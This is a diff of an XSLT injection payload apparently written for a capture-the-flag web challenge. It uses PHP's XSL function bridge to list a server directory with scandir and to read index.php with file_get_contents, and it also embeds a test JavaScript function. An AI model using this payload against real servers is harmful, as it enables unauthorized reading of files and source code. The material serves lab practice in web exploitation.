@@ -2,16 +2,16 @@
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
 xmlns:php="http://php.net/xsl"
 xmlns:msxsl="urn:schemas-microsoft-com:xslt"
-xmlns:user="http://mycompany.com/mynamespace"     
+xmlns:user111="http://mycompany.com/mynamespace"     
 >	
-<msxsl:script language="JavaScript" implements-prefix="user">
+<msxsl:script language="JavaScript" implements-prefix="user111">
 <![CDATA[
-function test1(){return "hello world!";}
+function test2(){return "hello world!";}
 ]]>
 </msxsl:script>
 <xsl:template match="/">	
 <xsl:param  name="shandle"    select="php:function('scandir','/challenge/web-serveur/ch50')" disable-output-escaping="yes"/>
-<xsl:param  name="strscand"   select="user:test1()" disable-output-escaping="yes"/> 
+<xsl:param  name="strscand"   select="user111:test2()" disable-output-escaping="yes"/> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
 <div style="background-color:teal;color:white;padding:4px">
 <span style="font-weight:bold">
